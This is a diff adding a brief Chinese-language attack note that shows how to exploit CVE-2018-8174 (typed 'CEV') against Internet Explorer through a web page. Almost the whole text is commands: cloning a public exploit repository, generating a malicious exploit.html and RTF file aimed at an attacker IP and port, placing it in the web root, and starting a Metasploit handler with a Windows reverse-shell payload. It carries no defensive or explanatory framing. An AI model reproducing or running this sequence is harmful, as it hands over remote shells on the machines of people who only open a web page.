@@ -1,0 +1,33 @@
+软件发行24小时内就出现破解
+CEV-2018-8174 浏览网页中招
+针对IE或者IE内核
+
+1.下载攻击模块
+┌──(root💀kali-linux-2021-3)-[~]
+└─# git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git 
+
+2.生成html文件
+cd CVE-2018-8174_EXP
+python CVE-2018-8174.py -u http://192.168.1.53/exploit.html -o hack.rtf -i 192.168.1.53 -p 4444
+-i 监听地址
+cp exploit.html /var/www/html
+
+3.监听
+
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfdb run 
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
+更换win载荷
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > run
+
+
+
+
+
+
+
+
+
+
